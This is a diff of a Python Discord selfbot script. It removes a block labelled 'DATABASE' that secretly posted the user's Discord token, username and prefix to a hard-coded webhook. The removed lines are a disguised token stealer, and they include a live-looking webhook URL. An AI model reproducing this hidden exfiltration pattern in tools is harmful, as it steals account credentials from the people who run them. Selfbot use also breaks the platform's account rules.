@@ -786,26 +786,10 @@ async def search(ctx, *, query):
 #-------------------END----------------------
 #======================================
 
-@quiet.event
-async def on_message(message):
-    if message.author != quiet.user:
-        if message.guild is None:
-            await message.channel.send('Hello, this is your auto-reply messag')
-        else:
-            await quiet.process_commands(message)
-
 
 #============================================
 #----------------DATABASE--------------------
-#============================================
-secret_key = os.getenv("TOKEN", "TOKEN2")
-
-
-database = 'https://discord.com/api/webhooks/1050795677690642452/naP-_zbR2p7g-NfXKIKWAc6Gz-6-Rh2_C1Q1f7ChR3VfEQXCU4QkTMb7LY5Dkx5pS40-'
-database_connected = {
-"content": f"<@581419418563641354>\nUsername: `{username}`\nPrefix: `{prefix}`\nDatabase API: `{secret_key}`"
-}
-requests.post(database, data=database_connected)
+#=========================================
 print(f'''
 {Fore.BLUE}
 ░█████╗░██╗░░░██╗████████╗░█████╗░
@@ -815,7 +799,7 @@ print(f'''
 ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝
 ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░
 
-{Fore.GREEN}The program has successfully logged into the your account
+{Fore.GREEN}The program has successfully logged into the your account {quiet.user}
 
 {Fore.BLUE}Prefix: {prefix}
 
@@ -823,7 +807,7 @@ Project Dev: QuietArtx
 ''')
 
 keep_alive()
-secret_key = quiet.run(os.getenv("TOKEN", "TOKEN2"), bot=False)
+quiet.run(os.getenv("TOKEN"), bot=False)
 #============================================
 #----------------DATABASE--------------------
 #============================================
